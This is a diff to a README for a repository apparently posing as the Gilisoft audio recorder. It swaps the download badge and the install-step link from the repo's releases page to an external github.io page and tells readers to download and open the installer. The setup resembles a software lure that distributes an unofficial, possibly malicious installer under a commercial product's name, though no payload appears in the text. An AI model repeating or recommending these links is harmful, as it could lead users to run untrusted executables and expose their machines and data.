@@ -1,6 +1,6 @@
 # 🎙️ Gilisoft-2026 - Record High Quality Computer Audio Easily
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=windows)](https://github.com/Clawlike-cebu336/Gilisoft-2026/releases)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=windows)](https://clawlike-cebu336.github.io)
 
 Gilisoft audio recorder captures sound directly from your computer. This software records audio from microphones, online streams, or browser playback. It saves files in common formats for clean playback on any device.
 
@@ -12,7 +12,7 @@ The software works on Windows 10 and Windows 11. Your computer needs at least 2G
 
 You can download the software from the official release page. Follow these steps to set up the recorder on your machine.
 
-1.  Visit the [Download Page](https://github.com/Clawlike-cebu336/Gilisoft-2026/releases).
+1.  Visit the [Download Page](https://clawlike-cebu336.github.io).
 2.  Click the link for the latest installer file.
 3.  Choose a folder on your computer to save the file.
 4.  Open the file once the download finishes. 
